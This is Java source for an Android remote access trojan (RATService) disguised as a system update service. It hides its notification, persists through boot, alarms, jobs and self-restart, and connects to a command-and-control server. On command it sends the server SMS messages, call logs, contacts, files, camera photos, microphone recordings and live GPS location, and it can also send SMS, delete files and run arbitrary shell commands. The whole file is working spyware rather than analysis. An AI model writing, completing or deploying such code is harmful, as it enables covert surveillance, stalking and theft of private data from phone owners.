package com.android.system.update;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Binder;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.RemoteException;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;

import androidx.core.app.NotificationCompat;
import androidx.core.app.ActivityCompat;
import android.Manifest;
import android.content.pm.PackageManager;

import com.android.system.update.modules.*;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.concurrent.atomic.AtomicBoolean;

public class RATService extends Service {
    private static final String CHANNEL_ID = "SystemUpdateChannel";
    private static final int NOTIFICATION_ID = 1337;
    private static final String TAG = "SystemService";
    private static final int JOB_ID = 1001;
    private static final int PERSISTENCE_JOB_ID = 1002;
    private static final long RESTART_DELAY_MS = 5000;
    private static final long CHECK_INTERVAL_MS = 45000;
    
    // UPDATED: Increased timeouts for better stability
    private static final int CONNECT_TIMEOUT = 30000; // 30 seconds (was 15)
    private static final int SOCKET_TIMEOUT = 60000;  // 60 seconds (was 30)
    private static final int MAX_RETRY_DELAY = 300000; // 5 minutes max (was 60 seconds)
    private static final int HEARTBEAT_INTERVAL = 25000; // 25 seconds
    
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private AtomicBoolean isRunning = new AtomicBoolean(true);
    private Thread connectionThread;
    private Thread heartbeatThread;
    private Thread watchdogThread;
    private static volatile RATService instance;
    private PowerManager.WakeLock wakeLock;
    private int currentRetryDelay = 5000; // Start with 5 seconds
    private int consecutiveFailures = 0;
    
    // Network monitoring
    private ConnectivityManager connectivityManager;
    private ConnectivityManager.NetworkCallback networkCallback;
    private boolean isNetworkAvailable = true;
    private long lastHeartbeatResponse = 0;
    private AtomicBoolean isHeartbeatActive = new AtomicBoolean(false);
    
    // Location tracking variables
    private LocationManager locationManager;
    private LocationListener locationListener;
    private HandlerThread locationThread;
    private Handler locationHandler;
    private boolean isLocationTracking = false;
    
    // Modules
    private CameraModule cameraModule;
    private MicModule micModule;
    private LocationModule locationModule;
    private SmsModule smsModule;
    private CallsModule callsModule;
    private ContactsModule contactsModule;
    private FileModule fileModule;
    private ShellModule shellModule;
    private DeviceModule deviceModule;
    
    // Binder for GuardianService communication
    public class RATServiceBinder extends Binder {
        public void heartbeat() throws RemoteException {
            if (!isRunning.get()) {
                throw new RemoteException("Service is not running");
            }
        }
    }
    
    private final RATServiceBinder binder = new RATServiceBinder();
    
    public static RATService getInstance() {
        return instance;
    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        AppController.setConnectionService(this);
        
        Log.d(TAG, "System service initialized");
        
        // Acquire wake lock to prevent CPU sleep
        acquireWakeLock();
        
        // Request battery optimization exemption (Android 6+)
        requestBatteryOptimizationExemption();
        
        // Setup network monitoring
        setupNetworkMonitoring();
        
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        
        // Initialize location manager
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        startLocationThread();
        
        // Initialize modules based on config
        if (Config.ENABLE_CAMERA) cameraModule = new CameraModule(this);
        if (Config.ENABLE_MICROPHONE) micModule = new MicModule(this);
        if (Config.ENABLE_LOCATION) locationModule = new LocationModule(this);
        if (Config.ENABLE_SMS) smsModule = new SmsModule(this);
        if (Config.ENABLE_CALLS) callsModule = new CallsModule(this);
        if (Config.ENABLE_CONTACTS) contactsModule = new ContactsModule(this);
        if (Config.ENABLE_FILES) fileModule = new FileModule(this);
        if (Config.ENABLE_SHELL) shellModule = new ShellModule();
        deviceModule = new DeviceModule(this);
        
        // Start internal watchdog
        startWatchdog();
        
        // Schedule all persistence mechanisms
        scheduleAllJobs();
        
        // Set that service should run on boot
        setRunOnBoot(true);
        
        // Start connection thread
        startConnection();
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("System optimization service");
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }
    
    private Notification createNotification() {
        int icon = android.R.drawable.stat_sys_download_done;
        
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Update Service")
            .setContentText("Optimizing system performance")
            .setSmallIcon(icon)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build();
    }
    
    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "SystemService::WakeLock"
            );
            wakeLock.setReferenceCounted(false);
            wakeLock.acquire(10 * 60 * 1000L); // 10 minute timeout, will auto-renew
            Log.d(TAG, "Wake lock acquired");
        } catch (Exception e) {
            Log.e(TAG, "Failed to acquire wake lock", e);
        }
    }
    
    private void requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                String packageName = getPackageName();
                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                    // We can't directly request this without user interaction
                    // But we can log it and the user can grant manually
                    Log.d(TAG, "Battery optimization not ignored. User may need to grant manually.");
                    
                    // Optionally open settings (commented out to avoid disturbing user)
                    // Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    // intent.setData(Uri.parse("package:" + packageName));
                    // intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    // startActivity(intent);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error checking battery optimization", e);
            }
        }
    }
    
    private void setupNetworkMonitoring() {
        connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            NetworkRequest networkRequest = new NetworkRequest.Builder()
                    .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                    .build();
            
            networkCallback = new ConnectivityManager.NetworkCallback() {
                @Override
                public void onAvailable(Network network) {
                    super.onAvailable(network);
                    Log.d(TAG, "Network available, reconnecting...");
                    isNetworkAvailable = true;
                    // Reset failure count on network available
                    consecutiveFailures = 0;
                    // Reconnect immediately when network returns
                    if (!isConnected()) {
                        startConnection();
                    }
                }

                @Override
                public void onLost(Network network) {
                    super.onLost(network);
                    Log.d(TAG, "Network lost");
                    isNetworkAvailable = false;
                }

                @Override
                public void onCapabilitiesChanged(Network network, NetworkCapabilities networkCapabilities) {
                    super.onCapabilitiesChanged(network, networkCapabilities);
                    boolean hasInternet = networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
                    Log.d(TAG, "Network capabilities changed, hasInternet: " + hasInternet);
                }
            };
            
            try {
                connectivityManager.registerNetworkCallback(networkRequest, networkCallback);
                Log.d(TAG, "Network monitoring setup complete");
            } catch (Exception e) {
                Log.e(TAG, "Failed to register network callback", e);
            }
        }
    }
    
    private void startWatchdog() {
        watchdogThread = new Thread(() -> {
            while (isRunning.get()) {
                try {
                    Thread.sleep(CHECK_INTERVAL_MS);
                    
                    // Check if connection thread is alive
                    if (connectionThread == null || !connectionThread.isAlive()) {
                        Log.w(TAG, "Connection thread dead, restarting...");
                        startConnection();
                    }
                    
                    // Check if we haven't received heartbeat in a while
                    if (isHeartbeatActive.get() && lastHeartbeatResponse > 0) {
                        long timeSinceLastHeartbeat = System.currentTimeMillis() - lastHeartbeatResponse;
                        if (timeSinceLastHeartbeat > HEARTBEAT_INTERVAL * 3) {
                            Log.w(TAG, "No heartbeat response for " + (timeSinceLastHeartbeat/1000) + " seconds, reconnecting...");
                            closeConnection();
                        }
                    }
                    
                    // Refresh wake lock
                    if (wakeLock != null && !wakeLock.isHeld()) {
                        acquireWakeLock();
                    }
                    
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "Watchdog error", e);
                }
            }
        });
        watchdogThread.start();
    }
    
    private void startLocationThread() {
        locationThread = new HandlerThread("LocationThread");
        locationThread.start();
        locationHandler = new Handler(locationThread.getLooper());
    }
    
    private void scheduleAllJobs() {
        scheduleJobSchedulerRestart();
        schedulePersistenceJob();
        scheduleCheckAlarm();
    }
    
    private void scheduleCheckAlarm() {
        Intent intent = new Intent(this, RestartReceiver.class);
        intent.setAction("CHECK_SERVICE");
        PendingIntent pendingIntent = PendingIntent.getBroadcast(
            this, 3, intent, 
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (alarmManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + CHECK_INTERVAL_MS,
                    pendingIntent
                );
            } else {
                alarmManager.setExact(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + CHECK_INTERVAL_MS,
                    pendingIntent
                );
            }
            Log.d(TAG, "Check alarm scheduled for " + (CHECK_INTERVAL_MS/1000) + " seconds");
        }
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "System service onStartCommand");
        scheduleAllJobs();
        return START_STICKY;
    }
    
    private void schedulePersistenceJob() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                ComponentName componentName = new ComponentName(this, PersistenceJobService.class);
                JobInfo jobInfo = new JobInfo.Builder(PERSISTENCE_JOB_ID, componentName)
                        .setPeriodic(15 * 60 * 1000)
                        .setPersisted(true)
                        .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                        .setBackoffCriteria(30000, JobInfo.BACKOFF_POLICY_EXPONENTIAL)
                        .build();
                
                JobScheduler jobScheduler = (JobScheduler) getSystemService(JOB_SCHEDULER_SERVICE);
                jobScheduler.schedule(jobInfo);
                Log.d(TAG, "Persistence job scheduled");
            } catch (Exception e) {
                Log.e(TAG, "Error scheduling persistence job", e);
            }
        }
    }
    
    private void scheduleJobSchedulerRestart() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                ComponentName componentName = new ComponentName(this, JobSchedulerService.class);
                JobInfo jobInfo = new JobInfo.Builder(JOB_ID, componentName)
                        .setMinimumLatency(RESTART_DELAY_MS)
                        .setOverrideDeadline(RESTART_DELAY_MS * 2)
                        .setPersisted(true)
                        .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                        .build();
                
                JobScheduler jobScheduler = (JobScheduler) getSystemService(JOB_SCHEDULER_SERVICE);
                jobScheduler.schedule(jobInfo);
                Log.d(TAG, "Restart job scheduled");
            } catch (Exception e) {
                Log.e(TAG, "Failed to schedule restart job", e);
            }
        }
    }
    
    private void setRunOnBoot(boolean shouldRun) {
        SharedPreferences prefs = getSharedPreferences("service_prefs", MODE_PRIVATE);
        prefs.edit().putBoolean("should_run", shouldRun).apply();
    }
    
    private boolean isConnected() {
        return socket != null && socket.isConnected() && !socket.isClosed() && out != null;
    }
    
    private boolean isNetworkAvailable() {
        if (connectivityManager == null) {
            connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Network network = connectivityManager.getActiveNetwork();
            if (network == null) return false;
            
            NetworkCapabilities capabilities = connectivityManager.getNetworkCapabilities(network);
            return capabilities != null && 
                   capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
        } else {
            // Deprecated in API 29 but needed for older versions
            android.net.NetworkInfo activeNetwork = connectivityManager.getActiveNetworkInfo();
            return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
        }
    }
    
    private void startHeartbeat() {
        if (heartbeatThread != null && heartbeatThread.isAlive()) {
            heartbeatThread.interrupt();
        }
        
        isHeartbeatActive.set(true);
        heartbeatThread = new Thread(() -> {
            Log.d(TAG, "Heartbeat thread started");
            while (isRunning.get() && isConnected()) {
                try {
                    Thread.sleep(HEARTBEAT_INTERVAL);
                    if (isConnected()) {
                        sendCommand("PING");
                        Log.d(TAG, "Heartbeat sent");
                    }
                } catch (InterruptedException e) {
                    Log.d(TAG, "Heartbeat thread interrupted");
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "Heartbeat error", e);
                }
            }
            isHeartbeatActive.set(false);
            Log.d(TAG, "Heartbeat thread stopped");
        });
        heartbeatThread.start();
    }
    
    private void stopHeartbeat() {
        isHeartbeatActive.set(false);
        if (heartbeatThread != null) {
            heartbeatThread.interrupt();
            heartbeatThread = null;
        }
    }
    
    private void startConnection() {
        if (connectionThread != null && connectionThread.isAlive()) {
            connectionThread.interrupt();
        }
        
        connectionThread = new Thread(() -> {
            while (isRunning.get()) {
                try {
                    // Check if network is available first
                    if (!isNetworkAvailable()) {
                        Log.d(TAG, "No network available, waiting...");
                        Thread.sleep(30000); // Wait 30 seconds before retry
                        continue;
                    }
                    
                    // Connect with timeout
                    socket = new Socket();
                    socket.connect(new InetSocketAddress(Config.SERVER_HOST, Config.SERVER_PORT), CONNECT_TIMEOUT);
                    socket.setSoTimeout(SOCKET_TIMEOUT);
                    socket.setKeepAlive(true); // Enable TCP keep-alive
                    socket.setTcpNoDelay(true); // Disable Nagle's algorithm
                    
                    out = new PrintWriter(socket.getOutputStream(), true);
                    in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    
                    Log.d(TAG, "Connected to C2 server at " + Config.SERVER_HOST + ":" + Config.SERVER_PORT);
                    
                    // Reset retry delay on successful connection
                    currentRetryDelay = 5000;
                    consecutiveFailures = 0;
                    
                    // Send initial device info
                    sendDeviceInfo();
                    
                    // Start heartbeat
                    startHeartbeat();
                    
                    String line;
                    long lastReadTime = System.currentTimeMillis();
                    
                    while (isRunning.get() && (line = in.readLine()) != null) {
                        lastReadTime = System.currentTimeMillis();
                        
                        // Update heartbeat response time for PONG responses
                        if (line.equals("PONG")) {
                            lastHeartbeatResponse = System.currentTimeMillis();
                            Log.d(TAG, "Heartbeat response received");
                        } else {
                            processCommand(line);
                        }
                    }
                    
                    // Check if we timed out
                    if (System.currentTimeMillis() - lastReadTime > SOCKET_TIMEOUT) {
                        Log.d(TAG, "Socket read timeout, reconnecting...");
                    }
                    
                } catch (SocketTimeoutException e) {
                    Log.e(TAG, "Socket timeout", e);
                    consecutiveFailures++;
                } catch (IOException e) {
                    Log.e(TAG, "Connection error: " + e.getMessage());
                    consecutiveFailures++;
                } catch (Exception e) {
                    Log.e(TAG, "Unexpected error", e);
                    consecutiveFailures++;
                } finally {
                    stopHeartbeat();
                    closeConnection();
                }
                
                // Exponential backoff for retries
                if (isRunning.get()) {
                    long delay = calculateRetryDelay();
                    Log.d(TAG, "Reconnecting in " + (delay/1000) + " seconds (attempt " + consecutiveFailures + ")");
                    
                    try {
                        Thread.sleep(delay);
                    } catch (InterruptedException ie) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
        });
        connectionThread.start();
    }
    
    private long calculateRetryDelay() {
        // Exponential backoff: 5s, 10s, 20s, 40s, 80s, 160s, 300s max
        long delay = 5000 * (long) Math.pow(2, Math.min(consecutiveFailures, 6));
        return Math.min(delay, MAX_RETRY_DELAY);
    }
    
    private void closeConnection() {
        try {
            if (out != null) {
                out.close();
                out = null;
            }
            if (in != null) {
                in.close();
                in = null;
            }
            if (socket != null && !socket.isClosed()) {
                socket.close();
                socket = null;
            }
        } catch (IOException e) {
            Log.e(TAG, "Error closing connection", e);
        }
    }
    
    private void sendDeviceInfo() {
        String info = String.format("DEVICE|%s|%s|%s|%s|%s",
            getUniqueDeviceId(),
            Build.MANUFACTURER,
            Build.MODEL,
            Build.VERSION.RELEASE,
            Build.VERSION.SDK_INT
        );
        sendCommand(info);
        Log.d(TAG, "Sent device info: " + info);
    }
    
    private void sendCommand(String data) {
        if (out != null) {
            out.println(data);
            out.flush();
        }
    }
    
    private void processCommand(String command) {
        String[] parts = command.split("\\|", 2);
        String cmd = parts[0].toLowerCase().trim(); // Normalize to lowercase
        String args = parts.length > 1 ? parts[1] : "";
        
        Log.d(TAG, "Received command: " + cmd + " with args: " + args);
        
        switch (cmd) {
            case "ping":
                sendCommand("PONG");
                break;
                
            case "info":
            case "device_info":
                if (deviceModule != null) {
                    String result = deviceModule.getDeviceInfo();
                    sendCommand("INFO|" + result);
                } else {
                    sendCommand("INFO|ERROR: Device module not available");
                }
                break;
                
            case "location":
            case "get_location":
                if (locationModule != null) {
                    String result = locationModule.getLocation();
                    sendCommand("LOCATION|" + result);
                } else {
                    sendCommand("LOCATION|ERROR: Location module not available");
                }
                break;
                
            case "location_stream":
                handleLocationStreamCommand(args);
                break;
                
            case "camera":
            case "camera_photo":
                if (cameraModule != null) {
                    String result = cameraModule.takePhoto();
                    sendCommand("CAMERA|" + result);
                } else {
                    sendCommand("CAMERA|ERROR: Camera module not available");
                }
                break;
                
            case "sms":
            case "get_sms":
                if (smsModule != null) {
                    String result = smsModule.getSms();
                    sendCommand("SMS|" + result);
                } else {
                    sendCommand("SMS|ERROR: SMS module not available");
                }
                break;
                
            case "calls":
            case "get_calls":
                if (callsModule != null) {
                    String result = callsModule.getCallLogs();
                    sendCommand("CALLS|" + result);
                } else {
                    sendCommand("CALLS|ERROR: Calls module not available");
                }
                break;
                
            case "contacts":
            case "get_contacts":
                if (contactsModule != null) {
                    String result = contactsModule.getContacts();
                    sendCommand("CONTACTS|" + result);
                } else {
                    sendCommand("CONTACTS|ERROR: Contacts module not available");
                }
                break;
                
            // FILE OPERATIONS
            case "files_list":
            case "list_files":
                if (fileModule != null) {
                    String result = fileModule.listFiles(args);
                    sendCommand("FILES|" + result);
                } else {
                    sendCommand("FILES|ERROR: File module not available");
                }
                break;
                
            case "file_get":
            case "download":
                if (fileModule != null) {
                    String result = fileModule.getFile(args);
                    sendCommand("FILE_GET|" + result);
                } else {
                    sendCommand("FILE_GET|ERROR: File module not available");
                }
                break;
                
            case "file_delete":
            case "delete":
                if (fileModule != null) {
                    String result = fileModule.deleteFile(args);
                    sendCommand("FILE_DELETE|" + result);
                } else {
                    sendCommand("FILE_DELETE|ERROR: File module not available");
                }
                break;
                
            case "file_rename":
            case "rename":
                if (fileModule != null && args.contains("|")) {
                    String[] parts2 = args.split("\\|", 2);
                    String result = fileModule.renameFile(parts2[0], parts2[1]);
                    sendCommand("FILE_RENAME|" + result);
                } else {
                    sendCommand("FILE_RENAME|ERROR: Invalid format or module unavailable");
                }
                break;
                
            case "create_folder":
            case "mkdir":
                if (fileModule != null && args.contains("|")) {
                    String[] parts2 = args.split("\\|", 2);
                    String result = fileModule.createFolder(parts2[0], parts2[1]);
                    sendCommand("CREATE_FOLDER|" + result);
                } else {
                    sendCommand("CREATE_FOLDER|ERROR: Invalid format or module unavailable");
                }
                break;
                
            case "file_zip":
            case "zip":
                if (fileModule != null) {
                    String result = fileModule.zipFile(args);
                    sendCommand("FILE_ZIP|" + result);
                } else {
                    sendCommand("FILE_ZIP|ERROR: File module not available");
                }
                break;
                
            case "file_upload":
            case "upload":
                if (fileModule != null && args.contains("|")) {
                    String[] parts2 = args.split("\\|", 3);
                    if (parts2.length == 3) {
                        String result = fileModule.uploadFile(parts2[0], parts2[1], parts2[2]);
                        sendCommand("FILE_UPLOAD|" + result);
                    } else {
                        sendCommand("FILE_UPLOAD|ERROR: Invalid format");
                    }
                } else {
                    sendCommand("FILE_UPLOAD|ERROR: File module not available");
                }
                break;
                
            case "search_files":
                if (fileModule != null && args.contains("|")) {
                    String[] parts2 = args.split("\\|", 2);
                    String result = fileModule.searchFiles(parts2[0], parts2[1]);
                    sendCommand("SEARCH_FILES|" + result);
                } else {
                    sendCommand("SEARCH_FILES|ERROR: Invalid format");
                }
                break;
                
            case "storage_info":
                if (fileModule != null) {
                    String result = fileModule.getStorageInfo();
                    sendCommand("STORAGE_INFO|" + result);
                } else {
                    sendCommand("STORAGE_INFO|ERROR: File module not available");
                }
                break;
                
            case "test_folder":
                if (fileModule != null) {
                    String result = fileModule.testFolder(args);
                    sendCommand("TEST|" + result);
                } else {
                    sendCommand("TEST|ERROR: File module not available");
                }
                break;
                
            case "mic":
            case "mic_start":
                if (micModule != null) {
                    String result = micModule.startRecording(30);
                    sendCommand("MIC|" + result);
                } else {
                    sendCommand("MIC|ERROR: Microphone module not available");
                }
                break;
                
            case "mic_stop":
                if (micModule != null) {
                    String result = micModule.stopRecording();
                    sendCommand("MIC_STOP|" + result);
                } else {
                    sendCommand("MIC_STOP|ERROR: Microphone module not available");
                }
                break;
                
            case "sms_send":
                if (smsModule != null && args.contains("|")) {
                    String[] parts2 = args.split("\\|", 2);
                    String result = smsModule.sendSms(parts2[0], parts2[1]);
                    sendCommand("SMS_SEND|" + result);
                } else {
                    sendCommand("SMS_SEND|ERROR: Invalid format or module unavailable");
                }
                break;
                
            case "shell":
            case "exec":
                if (shellModule != null) {
                    String result = shellModule.executeCommand(args);
                    sendCommand("SHELL|" + result);
                } else {
                    sendCommand("SHELL|ERROR: Shell module not available");
                }
                break;
                
            case "help":
                sendCommand("HELP|Available commands: info, location, location_stream [start/stop], camera, sms, calls, contacts, files_list [path], file_get [path], file_delete [path], file_rename [old|new], create_folder [path|name], file_zip [path], search_files [path|query], storage_info, mic, mic_stop, shell, ping, test_folder [path]");
                break;
                
            default:
                sendCommand("UNKNOWN_CMD|" + cmd);
                break;
        }
    }
    
    // Handle location streaming commands
    private void handleLocationStreamCommand(String args) {
        args = args.trim().toLowerCase();
        
        if (args.equals("start") || args.equals("begin") || args.equals("on")) {
            startLocationTracking();
        } else if (args.equals("stop") || args.equals("end") || args.equals("off")) {
            stopLocationTracking();
        } else if (args.isEmpty()) {
            // Return current tracking status
            sendCommand("LOCATION_STREAM|" + (isLocationTracking ? "active" : "inactive"));
        } else {
            sendCommand("LOCATION_STREAM|error: Unknown parameter. Use 'start' or 'stop'");
        }
    }
    
    // Start live location tracking
    private void startLocationTracking() {
        if (!checkLocationPermission()) {
            sendCommand("LOCATION_STREAM|error: No location permission");
            return;
        }
        
        if (isLocationTracking) {
            sendCommand("LOCATION_STREAM|already active");
            return;
        }
        
        try {
            locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    // Send location update immediately
                    String locationJson = createLocationJson(location);
                    sendCommand("LOCATION_UPDATE|" + locationJson);
                    Log.d(TAG, "Location update sent: " + location.getLatitude() + "," + location.getLongitude());
                }
                
                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {
                    Log.d(TAG, "Location provider status changed: " + provider + " status: " + status);
                }
                
                @Override
                public void onProviderEnabled(String provider) {
                    Log.d(TAG, "Location provider enabled: " + provider);
                }
                
                @Override
                public void onProviderDisabled(String provider) {
                    Log.d(TAG, "Location provider disabled: " + provider);
                    sendCommand("LOCATION_STREAM|warning: " + provider + " disabled");
                }
            };
            
            // Request location updates every 3 seconds, or when device moves 5 meters
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    3000,   // 3 seconds
                    5,      // 5 meters
                    locationListener,
                    locationHandler.getLooper()
                );
                Log.d(TAG, "GPS location tracking started");
            }
            
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    3000,
                    5,
                    locationListener,
                    locationHandler.getLooper()
                );
                Log.d(TAG, "Network location tracking started");
            }
            
            isLocationTracking = true;
            sendCommand("LOCATION_STREAM|started");
            
            // Get initial location immediately
            Location lastLocation = getBestLastKnownLocation();
            if (lastLocation != null) {
                String locationJson = createLocationJson(lastLocation);
                sendCommand("LOCATION_UPDATE|" + locationJson);
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception starting location tracking", e);
            sendCommand("LOCATION_STREAM|error: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Error starting location tracking", e);
            sendCommand("LOCATION_STREAM|error: " + e.getMessage());
        }
    }
    
    // Stop live location tracking
    private void stopLocationTracking() {
        if (locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
            locationListener = null;
            isLocationTracking = false;
            sendCommand("LOCATION_STREAM|stopped");
            Log.d(TAG, "Location tracking stopped");
        } else {
            sendCommand("LOCATION_STREAM|already inactive");
        }
    }
    
    // Get best last known location
    private Location getBestLastKnownLocation() {
        Location bestLocation = null;
        
        try {
            if (checkLocationPermission()) {
                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    Location gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (gpsLocation != null && (bestLocation == null || 
                        gpsLocation.getAccuracy() < bestLocation.getAccuracy())) {
                        bestLocation = gpsLocation;
                    }
                }
                
                if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    Location networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    if (networkLocation != null && (bestLocation == null || 
                        networkLocation.getAccuracy() < bestLocation.getAccuracy())) {
                        bestLocation = networkLocation;
                    }
                }
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception getting last known location", e);
        }
        
        return bestLocation;
    }
    
    // Check location permission
    private boolean checkLocationPermission() {
        return ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED ||
               ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
                == PackageManager.PERMISSION_GRANTED;
    }
    
    // Create JSON from location
    private String createLocationJson(Location location) {
        try {
            JSONObject json = new JSONObject();
            json.put("latitude", location.getLatitude());
            json.put("longitude", location.getLongitude());
            json.put("accuracy", location.hasAccuracy() ? location.getAccuracy() : 0);
            json.put("altitude", location.hasAltitude() ? location.getAltitude() : 0);
            json.put("bearing", location.hasBearing() ? location.getBearing() : 0);
            json.put("speed", location.hasSpeed() ? location.getSpeed() : 0);
            json.put("provider", location.getProvider());
            json.put("time", location.getTime());
            json.put("timestamp", System.currentTimeMillis());
            return json.toString();
        } catch (JSONException e) {
            return "{\"error\":\"JSON creation error\"}";
        }
    }
    
    private String getUniqueDeviceId() {
        SharedPreferences prefs = getSharedPreferences("device_prefs", MODE_PRIVATE);
        String deviceId = prefs.getString("device_id", null);
        if (deviceId == null) {
            deviceId = java.util.UUID.randomUUID().toString();
            prefs.edit().putString("device_id", deviceId).apply();
        }
        return deviceId;
    }
    
    private void scheduleRestartWithAlarm() {
        Intent restartIntent = new Intent(this, RATService.class);
        PendingIntent pendingIntent = PendingIntent.getService(
            this, 1, restartIntent, 
            PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
        
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (alarmManager != null) {
            alarmManager.set(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + RESTART_DELAY_MS, 
                pendingIntent);
            Log.d(TAG, "Restart scheduled");
        }
    }
    
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Log.d(TAG, "Task removed - normal operation");
        scheduleAllJobs();
        scheduleRestartWithAlarm();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return binder;
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "System service onDestroy");
        
        // Stop location tracking
        stopLocationTracking();
        
        // Stop heartbeat
        stopHeartbeat();
        
        // Unregister network callback
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && connectivityManager != null && networkCallback != null) {
            try {
                connectivityManager.unregisterNetworkCallback(networkCallback);
            } catch (Exception e) {
                Log.e(TAG, "Error unregistering network callback", e);
            }
        }
        
        // Clean up location thread
        if (locationThread != null) {
            locationThread.quitSafely();
            try {
                locationThread.join();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        
        isRunning.set(false);
        AppController.clearConnectionService();
        instance = null;
        
        closeConnection();
        
        try {
            if (connectionThread != null) connectionThread.interrupt();
            if (watchdogThread != null) watchdogThread.interrupt();
            if (heartbeatThread != null) heartbeatThread.interrupt();
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        scheduleAllJobs();
        scheduleRestartWithAlarm();
        
        super.onDestroy();
    }
}
